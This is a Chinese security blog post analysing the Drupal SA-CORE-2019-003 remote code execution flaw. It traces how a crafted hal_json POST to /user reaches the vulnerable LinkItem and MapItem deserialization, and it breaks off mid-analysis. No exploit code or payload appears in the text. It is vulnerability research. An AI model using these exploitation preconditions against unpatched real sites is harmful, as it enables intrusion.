#  【技术分享】SA-CORE-2019-003：Drupal 远程命令执行分析   
原创 c1tas  安全客   2022-06-27 10:00  
  
![](https://mmbiz.qpic.cn/mmbiz_png/f4CbNfICAmW37ssiahhr7XHJpQQRt7lL5ibA7JZDIxkqfPvqFuYoM8ficicWnmV5Z7czrAKZzjPWNlGbNkj4lpBkcA/640?wx_fmt=png "")  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb401J19YFe6w86pnBLLcLESsibJicFK9OzNM7T44OuhYlFo8libskc4fD3zhuBiaquHFzQO3rB0QsOlhg/640?wx_fmt=png "")  
  
  
环境配置  
  
此处针对于版本  
```
# git logcommit 74e8c2055b33cb8794a7b53dc79b5549ce824bb3 (HEAD, tag: 8.6.9)
```  
  
好的环境也就漏洞分析的一大半  
  
drupal 的 rest 功能有点僵硬  
  
需满足的条件如下  
  
![](https://mmbiz.qpic.cn/mmbiz_png/f4CbNfICAmW37ssiahhr7XHJpQQRt7lL5aXuTAib8TDHAPSy9wTVGsBqqoy8eESc5UX5MyTrremmiafUqicC6wUIdA/640?wx_fmt=png "")  
  
管理界面这两个都得安排上  
  
但其实你会发现你安装了 drupal 你却没有 restui 这个东西  
  
到这里下载 解压  
  
https://www.drupal.org/project/restui  
  
![](https://mmbiz.qpic.cn/mmbiz_png/f4CbNfICAmW37ssiahhr7XHJpQQRt7lL52K3NLcTGlgtlRLsicgvfEhTPCLw1lpbaLFOJoflZ6RAicicJfdZd880UQ/640?wx_fmt=png "")  
  
放置于此。 为什么呢，你看看这个 README.txt  
  
![](https://mmbiz.qpic.cn/mmbiz_png/f4CbNfICAmW37ssiahhr7XHJpQQRt7lL5V2FOJibNJroFjGPDictgx5ibXuk3q4erTXasSiaFGV2uvIPdplFcF2wfrQ/640?wx_fmt=png "")  
  
悟道  
  
![](https://mmbiz.qpic.cn/mmbiz_png/f4CbNfICAmW37ssiahhr7XHJpQQRt7lL5ug9DLnSmXwvZPj2sM1xcLBPWVCICibHKY24qDXMxAg48Ef7MnIqYgBg/640?wx_fmt=png "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/f4CbNfICAmW37ssiahhr7XHJpQQRt7lL5aWfibMefKx9Z9pu3uPunVUqG2zYcuGAc4n2BsdcibITQcAr5KsPxEL8w/640?wx_fmt=png "")  
  
把这个 enable  
  
还需要 设置允许匿名用户利用 POST 来访问 /user/register  
  
![](https://mmbiz.qpic.cn/mmbiz_png/f4CbNfICAmW37ssiahhr7XHJpQQRt7lL518vibvKQOlE0wOTEW0vLkdzv6ibg4iadY6bdkwn1BwA5snXqbGencUfGQ/640?wx_fmt=png "")  
  
实际还得装上 hal 这个处理 json 的扩展  
  
![](https://mmbiz.qpic.cn/mmbiz_png/f4CbNfICAmW37ssiahhr7XHJpQQRt7lL56Hs4k6aNnmbxgbmpSBQs9iazPoMsAFtNWwztfFJxl6Jr6NT29cQ30dA/640?wx_fmt=png "")  
  
至此环境配置结束 。。。 坑还是有点多  
  
关于 PHP 调试我是以 Docker 为主体做的远程调试配置，如果对此感兴趣的话，将在下次做一些展开。  
  
毕竟一个 docker-compose up 就能实现调试，还算能减少一些环境配置的过程  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb401J19YFe6w86pnBLLcLESsibJicFK9OzNM7T44OuhYlFo8libskc4fD3zhuBiaquHFzQO3rB0QsOlhg/640?wx_fmt=png "")  
  
  
分析  
  
本文将以两个角度共同对该漏洞的产生，drupal 的设计模式，drupal normalize/denormailze 的实现进行详尽的分析以及阐释  
  
分析中的各个有意思的点以及关键位置如下目录所示  
  
hal_json 的条件  
  
getDenormalizer 解析  
  
link types 的由来  
  
$entity->get() 解析  
  
type shortcut 解析流程  
  
symfony interface 简单逻辑  
### 简单流程  
  
![](https://mmbiz.qpic.cn/mmbiz_png/f4CbNfICAmW37ssiahhr7XHJpQQRt7lL51apibzd4dVBGL3icwaPYnZ4jicKcWIILkJIvwSplAYOz8HICwNd3y8xjg/640?wx_fmt=png "")  
  
drupal 是基于 symfony 的框架的 web 框架，这框架接口等待以后进行补全  
  
![](https://mmbiz.qpic.cn/mmbiz_png/f4CbNfICAmW37ssiahhr7XHJpQQRt7lL51apibzd4dVBGL3icwaPYnZ4jicKcWIILkJIvwSplAYOz8HICwNd3y8xjg/640?wx_fmt=png "")  
  
这里截图一下 denormalize 的栈  
  
根据 云鼎 RR 的分析  
  
![](https://mmbiz.qpic.cn/mmbiz_png/f4CbNfICAmW37ssiahhr7XHJpQQRt7lL58OSphT5iabxgtyDvFncdHnL4gWCbLaHXXgWwe1wM7mWuhlMrZ5qE8oA/640?wx_fmt=png "")  
  
注意 Content-Type:application/hal+json 字段 (未验证是否起决定作用)  
  
这里的 _links->type->href 就会决定这里的 content_target 最后返回的类型  
  
![](https://mmbiz.qpic.cn/mmbiz_png/f4CbNfICAmW37ssiahhr7XHJpQQRt7lL55UiaPmGiazgeG2uql9MoRGKMgX3gJ2g44UeOkouECWnjyUbvib0AEO2Og/640?wx_fmt=png "")  
  
接着往下走  
  
![](https://mmbiz.qpic.cn/mmbiz_png/f4CbNfICAmW37ssiahhr7XHJpQQRt7lL5rHCbYT8POOicKYiczibz7b8sFQedgFibpM39LGDnAibia9FxcaUPLXCU7AeA/640?wx_fmt=png "")  
  
成功到了 git diff 能观测到的漏洞触发点  
  
MapItem  
  
![](https://mmbiz.qpic.cn/mmbiz_png/f4CbNfICAmW37ssiahhr7XHJpQQRt7lL5TzgKILrrhxs2pow7AxCtYM1icQsnnx26Cnic4Zib6FvsloKHd1eHic8hPQ/640?wx_fmt=png "")  
  
LinkItem  
  
![](https://mmbiz.qpic.cn/mmbiz_png/f4CbNfICAmW37ssiahhr7XHJpQQRt7lL5ygu4XLqmlOYqE3Hz6KTfxg8kunfGf9WdEduql7fquVzvVic9nfq5nRQ/640?wx_fmt=png "")  
### 入口入手  
> 从入口入手可以直观的看到整个框架的运行流程以及方便整理出流程关系甚至你可以获得设计模式  
  
  
其实代码结构中的 core/rest/RequestHandler.php 这种命名格式的文件一般就是继承或者注册了路由的处理函数，肯定可以作为入手点进行观测  
  
![](https://mmbiz.qpic.cn/mmbiz_png/f4CbNfICAmW37ssiahhr7XHJpQQRt7lL5qpicpN5BwY9y3CAxrXCzAQnvRWJYMhNUGSzhBEpKVmhnNZ3BXCPt6FQ/640?wx_fmt=png "")  
  
其中进行了 deserialize 处理  
  
![](https://mmbiz.qpic.cn/mmbiz_png/f4CbNfICAmW37ssiahhr7XHJpQQRt7lL56qhcvdNn30pV7sbrWYCdU0KW6r88f5td1L3tv0d9LbaNNXTPIpKKAQ/640?wx_fmt=png "")  
  
renew_getDenormalizer  
  
而在阅读代码中，这是第一处 getDenormalizer 的调用  
  
![](https://mmbiz.qpic.cn/mmbiz_png/f4CbNfICAmW37ssiahhr7XHJpQQRt7lL5jshdZLEPXUHt68MZfJicyUwoXzjJ7daorkTqgic3MFnDAjkuxJ2G3RtQ/640?wx_fmt=png "")  
  
$this->normalizers  
  
![](https://mmbiz.qpic.cn/mmbiz_png/f4CbNfICAmW37ssiahhr7XHJpQQRt7lL5N1sCpAETwCyEIMKGnhUjoAr89tgM0fnOhEBKJ6aHycKrQJp7Foht5w/640?wx_fmt=png "")  
  
为什么 DrupalusersEntityUser 可以对应到 ContentEntityNormalizer 呢？  
  
![](https://mmbiz.qpic.cn/mmbiz_png/f4CbNfICAmW37ssiahhr7XHJpQQRt7lL5sqmZdf7MLjQN1xxiaLMQic78icTcjbfXs4jxazAA6z890BRxiblwVuZjDw/640?wx_fmt=png "")  
  
这里因为有一层 User 继承 ContentEntityBase ， ContentEntityBase 实现了 ContentEntityInterface，而对应了 ContentEntityNormalizer  
  
![](https://mmbiz.qpic.cn/mmbiz_png/f4CbNfICAmW37ssiahhr7XHJpQQRt7lL5e1BILBrFcuetkbkpEhkKNvvDKsc9CsP1Du48L87Ym5AicR66B5ee86A/640?wx_fmt=png "")  
  
hal_json 实际由来的情况  
  
![](https://mmbiz.qpic.cn/mmbiz_png/f4CbNfICAmW37ssiahhr7XHJpQQRt7lL5IXpPyqtrrT6N3iaumQdBYldicGo9tp4U8Biao9Xbxrv9JbWqiaMEQpEN4A/640?wx_fmt=png "")  
  
hal_json_detail  
  
这里就出现了狼人情况， 这总共 18 个 Normalizer 而且是在 开启 HAL 情况下才会有 DrupalhalNormalizer* 其他的 Normalizer $format 全为 null 无法继续处理 对于 /DrupalhalNormalizer* 来说 $format 只有 hal_json ，从这里定下  
  
GET 参数 _format=hal_json  
  
![](https://mmbiz.qpic.cn/mmbiz_png/f4CbNfICAmW37ssiahhr7XHJpQQRt7lL5GGOpEFRykaQib2XqfWsRa5goX7F8MIN4ZytJGbhUKSu3GaEbon3ibHkQ/640?wx_fmt=png "")  
  
所以在进行 in_array 判断成立 过了 checkFormat 的判断后  
  
![](https://mmbiz.qpic.cn/mmbiz_png/f4CbNfICAmW37ssiahhr7XHJpQQRt7lL5odRwzprZBmeMDMyA2On2bDdRBlveF4GiaIib5teB1ASYoN8xUIzic8r5w/640?wx_fmt=png "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/f4CbNfICAmW37ssiahhr7XHJpQQRt7lL50stYwQcUOGmVszghdrbTmnKZX6tO7Nxb2eCxmo6vHNCzB7FNBNEglg/640?wx_fmt=png "")  
  
还进行了针对 DrupaluserEntityUser 的继承关系检测  
  
![](https://mmbiz.qpic.cn/mmbiz_png/f4CbNfICAmW37ssiahhr7XHJpQQRt7lL519NyvfiaC1N94CpS3IOdogAvBEGe8NUQiaFRKpeTNbicvQlbhRrhICIOQ/640?wx_fmt=png "")  
  
supportsDenormalization 针对 DrupaluserEntityUser 而找到了 ContentEntityNormalizer  
  
第一阶段通过 路由 /user 决定 entity DrupaluserEntityUser 进行第一部分的 denormalize 而使用的就是 ContentEntityNormalizer->denormalize  
  
进行第二阶段 ContentEntityNormalizer 反序列化根据 POST 中传递的 _link->type 来决定处理的 entity， 关于 entity 的处理可以向下继续阅读  
  
继续调用 denormalizeFieldData 来实现进一步的处理  
  
关于此处的 denormalizeFieldData  
  
![](https://mmbiz.qpic.cn/mmbiz_png/f4CbNfICAmW37ssiahhr7XHJpQQRt7lL50uQFRvU0O0wxibibneoiaklkmIf6a2iaKBljYRdyr0bp6k5ybU1cU4kWJg/640?wx_fmt=png "")  
  
因为使用了 Trait 这种 php 中的特性  
  
PHP: Traits – Manual  
  
![](https://mmbiz.qpic.cn/mmbiz_png/f4CbNfICAmW37ssiahhr7XHJpQQRt7lL5qGAY2G9tOQLlDkolvqz7kGJb472icQFKmpXFwaic39WTq3zsABfxj6XA/640?wx_fmt=png "")  
  
所以才到了 FieldableEntityNormalizerTrait 中进行具体的处理  
  
所以调用 DrupalhalNormalizerContentEntityNormalizer 的 denormalizer 方法  
  
![](https://mmbiz.qpic.cn/mmbiz_png/f4CbNfICAmW37ssiahhr7XHJpQQRt7lL5z7Lz3MG51224qNXDPBftpAnSdWR5sdIu4UtMdNIIyBPTAVVKvEM3Jg/640?wx_fmt=png "")  
  
$data 是传入的 post content 被处理后的对象， 那么可以看到此处在通过获得 POST->_links->type  
 的值  
  
![](https://mmbiz.qpic.cn/mmbiz_png/f4CbNfICAmW37ssiahhr7XHJpQQRt7lL5FemvnfKJ49L2HIobbLrLaNBMVgTyPc8nnX0fqIkuicoywAMF2fScu4Q/640?wx_fmt=png "")  
  
如果存在 POST->_links->type->href  
 字段那么就直接给 $types  
 赋值  
  
![](https://mmbiz.qpic.cn/mmbiz_png/f4CbNfICAmW37ssiahhr7XHJpQQRt7lL5te7tJ6S5Awvwb3QZKjVicRFgOEGTkJZqAXhdacd9TxodcVyLSibDuPEQ/640?wx_fmt=png "")  
  
那么 getTypeInternalIds 就成为了要满足的条件  
  
![](https://mmbiz.qpic.cn/mmbiz_png/f4CbNfICAmW37ssiahhr7XHJpQQRt7lL5WUrqdfmMgS9U5q5MY6sRzhBdbicTsicRIWY2eV9SVTOibFfZicoqmTFjUA/640?wx_fmt=png "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/f4CbNfICAmW37ssiahhr7XHJpQQRt7lL5nUp2icYWuBlLWG5393kR4TicFDicBJKch9Cs9smS47ibunuR2sNnn81feA/640?wx_fmt=png "")  
  
cache_data_types  
  
![](https://mmbiz.qpic.cn/mmbiz_png/f4CbNfICAmW37ssiahhr7XHJpQQRt7lL5v1Cas4xibuPxKoGVS3TpWEp79hjLfCYYww2rnoJwzWy9wGVp3PeIDRg/640?wx_fmt=png "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/f4CbNfICAmW37ssiahhr7XHJpQQRt7lL5RJlGCT8icLyWvtghapcwL1mwwdGtDfwfJAiavPN2hBE7xibm7Uugib8ibDQ/640?wx_fmt=png "")  
  
从 cache 中取 key 为 hal:links:types  
 的缓存 可以看到总共有 37 条缓存，这些缓存的对应关系都如下  
  
![](https://mmbiz.qpic.cn/mmbiz_png/f4CbNfICAmW37ssiahhr7XHJpQQRt7lL5D7sgh2dIGr7ChianZcU5GDCAHuPX6fCLib0bnPUEnwHdzK6qSuVUzDXA/640?wx_fmt=png "")  
  
可以看到只要传入这 37 条的任意一条均可通过验证  
  
此处返回对象即为  
  
![](https://mmbiz.qpic.cn/mmbiz_png/f4CbNfICAmW37ssiahhr7XHJpQQRt7lL5LQjFUCXxqVJkGlEZ8AEJWpDldG1KDVrgImibLLDphRPHcQeaOrzE5mw/640?wx_fmt=png "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/f4CbNfICAmW37ssiahhr7XHJpQQRt7lL51YyMPMctIxkp44QXclDclpalmoGVAaVdXCE8uLKQsd2EunLCibnnsmQ/640?wx_fmt=png "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/f4CbNfICAmW37ssiahhr7XHJpQQRt7lL5JxTpwRn9VQy9vY0Qt9keibCyfcAicJfhsLOAzjniahYOiaZSBKj2U4ia4wQ/640?wx_fmt=png "")  
  
赋值 $value -> value[shortcut_set]=’default’  
  
![](https://mmbiz.qpic.cn/mmbiz_png/f4CbNfICAmW37ssiahhr7XHJpQQRt7lL5VTH3EdsM5n6r9NPeicLaMmsR0qNe9iaibCH1wv7l8mdHY3qZC62EplfaA/640?wx_fmt=png "")  
  
通过  
- entity_type ‘shortcut’  
  
- bundle ‘default’  
  
获得出 DrupalshortcutEntityShortcut 对象 调用 create 传入上述 $value  
  
![](https://mmbiz.qpic.cn/mmbiz_png/f4CbNfICAmW37ssiahhr7XHJpQQRt7lL5xp298qoeKAuDufyFTs2xNzkPNIaZjgwhD2o7OEcqhPg9ae5G7JDzJA/640?wx_fmt=png "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/f4CbNfICAmW37ssiahhr7XHJpQQRt7lL5iafI3vsDLibDFnLJNqUzica4usT3QJTWUbOeJtjf91WzaY5OJ5JUaKxzA/640?wx_fmt=png "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/f4CbNfICAmW37ssiahhr7XHJpQQRt7lL5TOiaoWcCbbK58Oo6UpfG4Pkic7TTll9uysoK44hVLAdIibuKUib1Be4nLg/640?wx_fmt=png "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/f4CbNfICAmW37ssiahhr7XHJpQQRt7lL55KCRFchO5MYRiccky6VwobuoZdiaJz20CcibuQH8cx6x9vJZqqnebDGag/640?wx_fmt=png "")  
  
EntityTypeManager->getDefinition  
  
![](https://mmbiz.qpic.cn/mmbiz_png/f4CbNfICAmW37ssiahhr7XHJpQQRt7lL5DxLyVHcW9PGHeCwxX7eKjYibhXN0fL7LXmp6aB9QhtqibduE4ZDfputg/640?wx_fmt=png "")  
  
DiscoveryCachedTrait->getDefinition  
  
![](https://mmbiz.qpic.cn/mmbiz_png/f4CbNfICAmW37ssiahhr7XHJpQQRt7lL5LQStZGWwXGHmlxsNDM4AUbUmdF2RicMVgr0yNGwo8hjiaJDXcu8ZJvwA/640?wx_fmt=png "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/f4CbNfICAmW37ssiahhr7XHJpQQRt7lL5IJk9bezB0NoPCZTrsT2qT3d7ibpckBgKYKjBbJDkruPSwasHgUib1yvA/640?wx_fmt=png "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/f4CbNfICAmW37ssiahhr7XHJpQQRt7lL5u895xrOAfP4M69ghKDjupQsdGhmTEiawibBrtSoMeGdbWzoOM1goticicg/640?wx_fmt=png "")  
  
ContentEntityType  
 是继承于 EntityType  
 的,所以在调用 getHandlerClass  
 的时候是使用 EntityType  
 中的方法  
  
![](https://mmbiz.qpic.cn/mmbiz_png/f4CbNfICAmW37ssiahhr7XHJpQQRt7lL5yqBJPptCodGIN4VjxSd1zq2H2ZQnSfEm9CtMTQrIlQgczZPW0bXDeA/640?wx_fmt=png "")  
  
在 post 数据初始化 getStorage 的过程中经过 handler 的有  
- rest_resource_config  
  
- user_role  
  
- shortcut  
  
而且进一步观察到 $this->handlers[$handler_type][$entity_type] 这个值在调用 getHandler 的时候如果没有被 set 那么就会通过如上过程完成初始化  
  
然后对此处断点，去回顾一下在 drupal 运行流程中什么时候会触发 EntityTypeManager 的 getHandler 初始化并且初始化的值分别是什么  
  
流程如下  
- $definition = $this->getDefinition($entity_type);  
  
- $class = $definition->getHandlerClass($handler_type);  
  
- $this->handlers[$handler_type][$entity_type] = $this->createHandlerInstance($class, $definition);  
  
- ![](https://mmbiz.qpic.cn/mmbiz_png/f4CbNfICAmW37ssiahhr7XHJpQQRt7lL5BuKkng6sPK1LibCvZ65YXpXFfibia0WZrAY8cUwZR5vPchL6CibRLR7Yaw/640?wx_fmt=png "")  
  
而实例生成的效果基本就是以 $class 然后传入 $definition 进行实例化  
  
那么可以说是至关重要的点就是在于 getDefinition($entity_type) 此处的实现而此处的 entity_type 和上文传入的 _links->type 字段是有绑定关系的  
  
![](https://mmbiz.qpic.cn/mmbiz_png/f4CbNfICAmW37ssiahhr7XHJpQQRt7lL5eiciaTFyiaovJCwzyZeOiay3zL7jqMkKtJLKhT28NO3OSEXxycnbpiaFnfg/640?wx_fmt=png "")  
  
回到 create  
  
![](https://mmbiz.qpic.cn/mmbiz_png/f4CbNfICAmW37ssiahhr7XHJpQQRt7lL5muWL4icCReibcwEzVgLqEQZjSWxicGhO09KMaKMU5icDl0YbkZm79ZgY1g/640?wx_fmt=png "")  
  
SqlContentEntityStorage 继承 ContentEntityStorageBase， ContentEntityStorageBase 继承 EntityStorageBase  
  
EntityStorageBase 的构造函数  
  
![](https://mmbiz.qpic.cn/mmbiz_png/f4CbNfICAmW37ssiahhr7XHJpQQRt7lL54X4fHc9qCibXKTFJdUiaUSY30HJdSTP21vsvAibFNV3CAZPGicabJlHcTQ/640?wx_fmt=png "")  
  
调用节点是发生在 createHandlerInstance  
 的时候  
  
![](https://mmbiz.qpic.cn/mmbiz_png/f4CbNfICAmW37ssiahhr7XHJpQQRt7lL5JKFknczSucOzLse88cABAQ9SMSJeQo9pvBf1oN9Xz7rAcuvuFkHKibQ/640?wx_fmt=png "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/f4CbNfICAmW37ssiahhr7XHJpQQRt7lL59KwuM4RQKdsA9q5XNOnlZWPanjav9fC5DW1dcUTCMqZDVenxSR8eAQ/640?wx_fmt=png "")  
  
那么基本可以确定此处就是为什么限定 _links->type 字段的原因了，那么要确定 $entity_type 的值就得从漏洞触发的过滤出发了  
  
skip_shortcut_entity_process  
  
![](https://mmbiz.qpic.cn/mmbiz_png/f4CbNfICAmW37ssiahhr7XHJpQQRt7lL5YicpytoNeogsxUs1uOdc4micaOu4miaBMVqN6RUxt1gMNdo1akW9WDQ3g/640?wx_fmt=png "")  
  
而 getStorage  
 之后再通过 create  
 创建出对应的 entity  
 实体，进一步通过 ContentEntityNormalizer  
 的 denormalizeFieldData  
 进行处理 等效调用 FieldableEntityNormalizerTrait  
 中的 denormalizeFieldData  
  
![](https://mmbiz.qpic.cn/mmbiz_png/f4CbNfICAmW37ssiahhr7XHJpQQRt7lL54C0k0uPmxYdXplMXQojUiaRObvXjhf2VxGDbPib1zGceDuVOYvcVYGMQ/640?wx_fmt=png "")  
  
而进一步产生关联的地方在于 entity->get($field_name)  
  
而 $field_name 和 post 传入的 $data 息息相关并且是完全输入可控的部分  
  
entity_get_detail  
  
关于 entity->get($field_name) 的实现  
  
![](https://mmbiz.qpic.cn/mmbiz_png/f4CbNfICAmW37ssiahhr7XHJpQQRt7lL53sKZwS9d7uo5yQNulHC3NhldTPpDA61RiaatbA8JmKkxysicWPZaodOA/640?wx_fmt=png "")  
  
type_ShortCut  
  
在 ShortCut 的情况下只有 EntityReferenceFieldItemList，FieldItemList 这两种情况。  
  
那么非 ShortCut 的情况呢。  
  
在展开的时候尝试使用  
  
![](https://mmbiz.qpic.cn/mmbiz_png/f4CbNfICAmW37ssiahhr7XHJpQQRt7lL559boH7wDSnpEcLvGZyQU9KTSv8OeHGnR8mC8YY1wficDyM654dDCAGA/640?wx_fmt=png "")  
  
但发现了 ContentEntityNormalizer->denormalizeFieldData 会直接抛出异常  
  
![](https://mmbiz.qpic.cn/mmbiz_png/f4CbNfICAmW37ssiahhr7XHJpQQRt7lL53s3bxicsjxNS8R8jbVVvxKvibtJGKc1ZVDonFYFCXRzbS6avNEcaO0Ew/640?wx_fmt=png "")  
  
原因是因为  
  
![](https://mmbiz.qpic.cn/mmbiz_png/f4CbNfICAmW37ssiahhr7XHJpQQRt7lL56XcvibDEnG8kuPx1BTZrHbZTZuHaicN2mFkicgrvib0frKoFSV63RjCa6w/640?wx_fmt=png "")  
  
这个 use 限定了 denormalizeFieldData 可以被传入的实例类型  
  
必须为 FieldableEntityInterface 的实现  
  
因为没有直接 implements 的，转而寻找子类  
  
![](https://mmbiz.qpic.cn/mmbiz_png/f4CbNfICAmW37ssiahhr7XHJpQQRt7lL5dkYfvWk861W3JuKydoUUiclSND7Pe9pGnrecibM1dLRzyUXC36TibGI1g/640?wx_fmt=png "")  
  
实际有这一处  
  
![](https://mmbiz.qpic.cn/mmbiz_png/f4CbNfICAmW37ssiahhr7XHJpQQRt7lL5DYWs6NOMEmeOeyyebCpMcY9842QaPW6JsjvU2F4WFD9Om1eYljQPOQ/640?wx_fmt=png "")  
```
interface ContentEntityInterface extends Traversable, FieldableEntityInterface, TranslatableRevisionableInterface
```  
  
interface 类型的有  
- ShortcutInterface  
  
- MessageInterface  
  
- ContentModerationStateInterface  
  
- FileInterface  
  
- CommentInterface  
  
- ItemInterface  
  
- FeedInterface  
  
- UserInterface  
  
- BlockContentInterface  
  
- WorkspaceInterface  
  
- MenuLinkContentInterface  
  
- TermInterface  
  
- NodeInterface  
  
- MediaInterface  
  
回到刚才的要求里，并结合cache data 列表  
  
我验证的可用的有且仅有  
- shortcut/default (成立)  
  
- user/user (无 entity->get)  
  
- comment/comment  
  
- file/file  
  
shortcut/default 解析  
  
了解完这些之后  
  
那么此时就要开始根据最开始的 diff 结果开始进行情况过滤了。  
  
因为 denormalizeFieldData 这个在 DrupalserializationNormalizer 中实现的方法应该是属于定义的接口函数，会根据不同是实例调用到对应实例的 Normalizer 的子 denormalize 处理函数。此处由函数名以及代码逻辑得知此处由 field 来决定  
  
那么此处需要的 entity 是什么呢？ 从 diff 中看到受影响的是 MapItem LinkItem 这两个类，所以就得往上追溯是哪一个 entity 会调用到对应 Field。  
### Diff 入手  
  
从 diff 中看到受影响的是 MapItem LinkItem 这两个类，所以就得往上追溯是哪一个 entity 会调用到对应 Field。  
  
那就拿 LinkItem 开刀  
  
![](https://mmbiz.qpic.cn/mmbiz_png/f4CbNfICAmW37ssiahhr7XHJpQQRt7lL5nEq28m2AZveRfj0PphbZpib4rmT2VicLMsM0Zic5yWibhONHyh9kVvmwhA/640?wx_fmt=png "")  
  
interface_logic  
  
由于触发在 setValue 那么肯定是要去找对应的调用，而根据上文以及阅读的代码，drupal 封装自 symfony 而所有的方式基本都已用接口的方式实现，那么在这种设计模式下你是不可能直观的找到 LinkItem->setValue 这种简单的调用的。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/f4CbNfICAmW37ssiahhr7XHJpQQRt7lL5vTPg7ZyQ18WXHZOK0fiaoX29lMPysJah4bWIAIN2SsxJDjmWRAfUMPQ/640?wx_fmt=png "")  
  
phpstorm 的 FindUsage 果然无法精确定位这种设计模式 ：（  
  
那么此处就涉及到 drupal 的虚函数了，那么设计模式的东西真令人头大。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/f4CbNfICAmW37ssiahhr7XHJpQQRt7lL5qaicABSsKuIY7lLqicNTQeplzDg4PUh4Y3f4EiaCEI4JvlMp1gMehkkdw/640?wx_fmt=png "")  
  
LinkItem 实现了 LinkItemInterface  
 这个接口  
  
![](https://mmbiz.qpic.cn/mmbiz_png/f4CbNfICAmW37ssiahhr7XHJpQQRt7lL5WoITwkHZGicQ8N5VX1icCRH7jEvcicJQDbFDmiaSGxNtV8d6Re7hXUEbew/640?wx_fmt=png "")  
  
LinkItemInterface 继承于 FieldItemInterface  
  
![](https://mmbiz.qpic.cn/mmbiz_png/f4CbNfICAmW37ssiahhr7XHJpQQRt7lL5Vkbj1mjk8CiczdwEN4lXPKfgSexzI2m3mcVNaMtOs2P0h6wTuSh4SjA/640?wx_fmt=png "")  
  
可以在源码中找到针对 FieldItemInterface 实现序列化/反序列化的 FieldItemNormalizer  
  
emm 其实这里的理由并不够太充分，但实际阅读源码，drupal 中还有大量的类似实现，那么就可以确定这就是 drupal 的设计模式: 基础类实现具体接口，而对应的父接口则有固定的反序列化/序列化的实现  
  
![](https://mmbiz.qpic.cn/mmbiz_png/f4CbNfICAmW37ssiahhr7XHJpQQRt7lL5F4h44biaWUpGCpuxsuap98tTQYjmQmg0DhicSBv2EgP4gxicItj0ZxDqw/640?wx_fmt=png "")  
  
观测其反序列化实现中存在 setValue 的调用  
  
![](https://mmbiz.qpic.cn/mmbiz_png/f4CbNfICAmW37ssiahhr7XHJpQQRt7lL5JYXBicB8HXDu3skXfXUfhzXa5O7IYdg5jGxDGc8c4I1q255iciaHuNgJQ/640?wx_fmt=png "")  
  
那么只需要再去找 FieldItemNormalizer 的 denormalize 调用即可  
  
而在刚才阅读 denormalizeFieldData 的代码的时候就不难明白， drupal 中所有的序列化调用都是 symfony 的 DenormalizerInterface 的实现  
  
前期情况回顾一下  
  
![](https://mmbiz.qpic.cn/mmbiz_png/f4CbNfICAmW37ssiahhr7XHJpQQRt7lL5iaD09dAaIQwpDPAIPSkV6rh3GSd0Tav7JlJwmm7S48GwatbBL7R7ArA/640?wx_fmt=png "")  
  
Symfony Serializer->denormalize()  
 根据 post /user  
最终导向了 ContentEntityNormalizer->denormalizeFieldData()  
  
![](https://mmbiz.qpic.cn/mmbiz_png/f4CbNfICAmW37ssiahhr7XHJpQQRt7lL5bkQbrBFELicButsmMVAexC4d2pa6RZnLesOQ2aG4bpdiauuh0ESoiaujA/640?wx_fmt=png "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/f4CbNfICAmW37ssiahhr7XHJpQQRt7lL5vnBSHgM92aIrVLxfa3NaWuJicut2icaYQdXeh1abLbQcxNwqGmfBAzrA/640?wx_fmt=png "")  
  
此处的 entity 就是刚才分析的 getStorage=>create 这个过程创建的 entity 实体，下面即有所需的 denormalize 调用。要调用到 FieldItemNormalizer 就需要满足  
  
1）  
  
entity->get($field_name) 需要返回一个使用 DrupalCoreFieldFieldItemInterface 的实例  
  
2）  
  
![](https://mmbiz.qpic.cn/mmbiz_png/f4CbNfICAmW37ssiahhr7XHJpQQRt7lL5c5s4jszK0l19DicZrZCUHUmu0M7foib4DfjcNiaicQYfoNGovl2SVMYibXw/640?wx_fmt=png "")  
  
此处 getDenormalizer  
 的检验上文已经说过 点我回顾  
  
![](https://mmbiz.qpic.cn/mmbiz_png/f4CbNfICAmW37ssiahhr7XHJpQQRt7lL5s0l43TwianqCwDaMrzXDD0bIT2BJWws0Ccw8k0XW9kI7Y5zbddCVI8g/640?wx_fmt=png "")  
  
实际也还是在这 18 个结果中找到对应的条件  
  
![](https://mmbiz.qpic.cn/mmbiz_png/f4CbNfICAmW37ssiahhr7XHJpQQRt7lL5TsxwcrXrxX68xJTRjZPviazc4tapDTCcicmkRsKQ9ToGiauWDq3M8Nwvw/640?wx_fmt=png "")  
  
要获得 FieldItemNormalizer  
 就必须满足传入的数据是 DrupalCoreFieldFieldItemInterface  
 这个接口的实现或者是子类接口的实现  
  
![](https://mmbiz.qpic.cn/mmbiz_png/f4CbNfICAmW37ssiahhr7XHJpQQRt7lL5VDIxZk0puyCPnxZ80XrmWn7z1HqcJaRXUXaiascfjCzRoKnvukP6mdA/640?wx_fmt=png "")  
  
这就是一个直接可以搜索到的子类接口  
  
![](https://mmbiz.qpic.cn/mmbiz_png/f4CbNfICAmW37ssiahhr7XHJpQQRt7lL5wxLQocxdVDEstmxrwaqmgNRTviadp04s37ib177d5nkJbiaW0wha4dk5g/640?wx_fmt=png "")  
  
而这就是是其对应的实现  
  
从而问题就变成了 $entity->get($field_name); 如何才能返回  
  
FieldItemInterface 那么问题就来了，根据  
  
shortcut/default 解析  
  
entity->get 解析  
  
这里的分析，没有满足 FieldItemInterface 这个条件的情况。  
  
有的是如下两种情况  
  
EntityReferenceFieldItemList，FieldItemList  
  
但是这里可以联想以及搜索一下 FieldItemList ，毕竟和所需的元素只有状态的差别 List->Item 这里从 pythoner 的角度不难觉得是可以联想的  
  
那么就以 FieldItemList 向下推导  
  
